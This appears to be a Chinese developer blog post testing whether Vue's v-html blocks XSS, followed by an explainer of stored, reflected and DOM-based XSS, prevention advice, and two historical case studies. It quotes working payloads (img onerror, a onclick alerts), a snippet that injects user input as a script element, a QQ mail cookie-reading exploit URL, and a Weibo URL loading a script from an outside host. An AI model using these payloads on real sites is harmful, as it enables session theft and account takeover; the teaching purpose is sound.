> 在开发员工门户的时候有一详情页面是通过请求模板字符串直接来渲染的，拿到模板后使用 js-xss过滤。
>
> 而有同事认为没有必要使用一个库专门来过滤一下，vue或许自带了过滤特字符的转义。到底行不行我用实际的代码来证明。

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>xss测试</title>
</head>

<body>
  <div id="app">
    <p v-html="inputStr"></p>
    <input type="text" v-model="inputStr"  style="width: 300px;">
  </div>
    
  <script src="https://unpkg.com/vue@next"></script>
  <script>
    const { createApp } = Vue;

    createApp({
      data() {
        return {
          inputStr: "&lt;img src='123' onerror='alert(1111)&gt;"
        };
      },
    }).mount('#app');
  </script>
</body>
</html>
```

![image-20221015231048229](C:\Users\乐此不疲\AppData\Roaming\Typora\typora-user-images\image-20221015231048229.png)![image-20221015231256349](C:\Users\乐此不疲\AppData\Roaming\Typora\typora-user-images\image-20221015231256349.png)

#### 当我输入一个脚本时 、并没有触发，这莫非就说明了以上的情况可以不需要用js-xss防御嘛？

其实这种情况只能说明这段脚本没有被执行，并不能说明是v-html自动转义的功劳，因为是他的功劳的话，页面上也应该显示这段script文本，就像这样形成该文本。![image-20221015232249981](C:\Users\乐此不疲\AppData\Roaming\Typora\typora-user-images\image-20221015232249981.png)

#### 我们在试试别的更高级的xss攻击`<a onclick="alert('攻击你')">连接</a>`

![image-20221015232605884](C:\Users\乐此不疲\AppData\Roaming\Typora\typora-user-images\image-20221015232605884.png)

#### 这里形成了一个a链接，当我们点击的时候触发了alert

![image-20221015232700920](C:\Users\乐此不疲\AppData\Roaming\Typora\typora-user-images\image-20221015232700920.png)

这足以说明v-html并不能过滤掉xss攻击。

我们在多式几种：`<img src="xx" onerror="alert('这个也可以攻')">`

![image-20221015233115347](C:\Users\乐此不疲\AppData\Roaming\Typora\typora-user-images\image-20221015233115347.png)

这种直接触发xss攻击

#### 那为什么第一种不行呢？[为什么vue v-html不执行script代码？](https://www.cnblogs.com/simonbaker/p/16203887.html)

可能他还不知道，这个不是vue的限制，而是html5中的规定。

html5中为了安全起见，不会执行innerHTML中插入的<script>的代码。

所以，如果想给v-html赋值<script>的代码，虽然能看到在dom中成功展示，但却不会执行<script>中的js代码的。

## 那v-html能否防御xss攻击？

既然v-html都不会执行<script>的js代码，那能否防御xss攻击呢？



**那我还是想在v-html中的标签里面执行js代码呢？**

这当然是可以的。



大概是先写段代码，创建script标签，然后append到指定标签即可。

```html
// html<h2 ref="testxss" v-html="testxss1"></h2><br/><input id="input"></input><button @click="clickBt">testinput</button>
// jsclickBt() {  const script = document.createElement('script')  script.innerHTML = document.getElementById('input').value  this.$refs.testxss.append(script)}
```

先来看看xss又多少种类型，都是怎么形成xss攻击的。

### 什么是 XSS

Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。

为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。

XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。

而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。

在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。

这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？

### XSS 分类

根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。

#### 存储型 XSS

存储型 XSS 的攻击步骤：

1. 攻击者将恶意代码提交到目标网站的数据库中。
2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

#### 反射型 XSS

反射型 XSS 的攻击步骤：

1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。

由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。

#### DOM 型 XSS

DOM 型 XSS 的攻击步骤：

1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL。
3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

## XSS 攻击的预防

通过前面的介绍可以得知，XSS 攻击有两大要素：

1. 攻击者提交恶意代码。
2. 浏览器执行恶意代码。

### 预防存储型和反射型 XSS 攻击

存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。

预防这两种漏洞，有两种常见做法：

- 改成纯前端渲染，把代码和数据分隔开。
- 对 HTML 做充分转义。

我们回到最开始提出的问题，相信同学们已经有了答案：

1. XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。

> 不正确。因为： * 防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。 * 转义应该在输出 HTML 时进行，而不是在提交用户输入时。

1. 所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。

> 不正确。 不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。

整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。

## XSS 攻击案例

#### QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞

攻击者发现 `http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb` 这个 URL 的参数 `uin`、`domain` 未经转义直接输出到 HTML 中。

于是攻击者构建出一个 URL，并引导用户去点击： `http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B`

用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：

```html
<script>
getTop().location.href="/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa"+"&t="+"&d=bbbb";return false;</script><script>alert(document.cookie)</script>"+"...
```

浏览器接收到响应后就会执行 `alert(document.cookie)`，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。

#### 新浪微博名人堂反射型 XSS 漏洞

攻击者发现 `http://weibo.com/pub/star/g/xyyyd` 这个 URL 的内容未经过滤直接输出到 HTML 中。

于是攻击者构建出一个 URL，然后诱导用户去点击：

```
http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>
```

用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：

```html
<li><a href="http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>">按分类检索</a></li>
```

浏览器接收到响应后就会加载执行恶意脚本 `//xxxx.cn/image/t.js`，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。

## js-xss

cdn上的没了

也不能直接通过链接及解析